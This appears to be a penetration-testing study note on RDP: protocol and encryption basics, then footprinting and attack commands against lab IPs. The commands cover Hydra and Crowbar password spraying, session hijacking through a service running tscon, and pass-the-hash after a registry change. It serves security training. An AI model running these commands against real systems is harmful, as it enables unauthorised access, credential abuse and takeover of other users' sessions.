# Remote Desktop Protocol (RDP)

The Remote Desktop Protocol (RDP) is a protocol developed by Microsoft to enable remote access to computers running the Windows operating system. It allows the transmission of display and control commands via an encrypted GUI over IP networks. RDP operates at the application layer of the TCP/IP reference model and typically uses TCP port 3389 as its transport protocol. Additionally, the connectionless UDP protocol can also use port 3389 for remote administration.

## Establishing an RDP Session

For an RDP session to be established, both the network firewall and the server's firewall must permit external connections. If Network Address Translation (NAT) is used between the client and server, as is often the case with Internet connections, the remote computer must have the public IP address to reach the server. Port forwarding must also be configured on the NAT router towards the server.

## Security and Encryption

Since Windows Vista, RDP has supported Transport Layer Security (TLS/SSL), ensuring that all data, particularly during the login process, is well-protected by encryption. However, many Windows systems do not enforce this and still accept weaker encryption via RDP Security. Even with RDP Security, an attacker is not entirely locked out, as the identity-providing certificates are often self-signed by default. This means the client cannot distinguish between a genuine and a forged certificate, leading to a certificate warning for the user.

## Default Installation and Configuration

The Remote Desktop service is installed by default on Windows servers and does not require any additional external applications. This service can be activated through the Server Manager and is configured by default to allow connections only from hosts with Network Level Authentication (NLA).

# Footprinting 

#### Nmap
```shell-session
$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
```

In addition, we can use `--packet-trace` to track individual packets and manually inspect their contents. This allows us to observe the RDP cookies (mstshash=nmap) used by Nmap to interact with the RDP server. However, it's important to note that threat hunters and various security services, such as Endpoint Detection and Response (EDR), can identify these cookies. Consequently, this could lead to penetration testers being locked out on hardened networks.

```shell-session
$ nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
```

#### RDP Security Check - Installation
```shell-session
$ sudo cpan
```

#### RDP Security Check
```shell-session
$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
$ ./rdp-sec-check.pl 10.129.201.248
```

Authentication and connection to such RDP servers can be made in several ways. For example, we can connect to RDP servers on Linux using `xfreerdp`, `rdesktop`, or `Remmina` and interact with the GUI of the server accordingly.

#### Initiate an RDP Session
```shell-session
$ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
```
```shell-session
# rdesktop -u admin -p password123 192.168.2.143
```
#### Crowbar - RDP Password Spraying
```shell-session
# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
#### Hydra - RDP Password Spraying
```shell-session
# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
#### RDP Session Hijacking
```cmd-session
C:\htb> query user
```
```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
```cmd-session
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```
```cmd-session
C:\htb> net start sessionhijack
```
## RDP Pass-the-Hash (PtH)
#### Adding the DisableRestrictedAdmin Registry Key
```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
Once is enabled:
```shell-session
# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```